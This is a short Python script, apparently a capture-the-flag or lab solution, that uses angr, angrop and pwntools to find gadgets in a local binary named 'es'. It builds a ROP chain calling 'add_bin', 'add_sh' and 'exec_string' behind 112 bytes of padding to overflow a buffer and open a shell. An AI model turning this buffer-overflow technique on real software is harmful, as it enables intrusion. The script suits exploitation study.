"""
Exploit write in angr with angrop module.
It highlights the potentiality and the comfortable syntax
"""

import angr, angrop
from pwn import *

file_path = 'es'
exe = ELF(file_path)

p = angr.Project(file_path)  # Create angr project
rop = p.analyses.ROP()  # Create ROP object
rop.find_gadgets()  # Find every gadgets in binary

# Build ROP chain
chain = rop.func_call("add_bin", [0xdeadbeef])
chain += rop.func_call("add_sh", [0xcafebabe, 0x0badf00d])
chain += rop.func_call("exec_string", [])

# Add padding for exploit
ropchain = b'A' * (108 + 4) + chain.payload_str()

# Executing the executable with ropchain as input
io = process([exe, ropchain])
io.interactive()
